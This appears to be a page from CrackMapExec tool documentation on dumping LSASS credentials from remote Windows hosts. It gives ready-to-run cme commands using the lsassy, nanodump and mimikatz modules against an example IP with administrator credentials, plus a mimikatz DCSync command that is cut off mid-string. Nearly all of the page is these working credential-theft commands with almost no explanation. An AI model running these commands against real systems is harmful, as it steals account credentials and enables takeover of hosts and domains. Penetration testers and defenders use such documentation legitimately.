# Dump LSASS



Using the module Lsassy from [@pixis ](https://twitter.com/HackAndDo)you can dump remotely the credentials&#x20;

```
#~ cme smb 192.168.255.131 -u administrator -p pass -M lsassy
```

<figure><img src="../../../../.gitbook/assets/image (59).png" alt=""><figcaption></figcaption></figure>

### Using nanodump

Using the module nanodump you can dump remotely the credentials&#x20;

```
#~ cme smb 192.168.255.131 -u administrator -p pass -M nanodump
```

### Using Mimikatz (deprecated)

{% hint style="warning" %}
You need at least local admin privilege on the remote target, use option **--local-auth** if your user is a local account
{% endhint %}

Using the module Mimikatz, the powershell script Invoke-mimikatz.ps1 will be executed on the remote target

```
#~ cme smb 192.168.255.131 -u administrator -p pass -M mimikatz
```

```
#~ cme smb 192.168.255.131 -u Administrator -p pass -M mimikatz -o COMMAND='"lsadump::dcsync /domain:doma
```
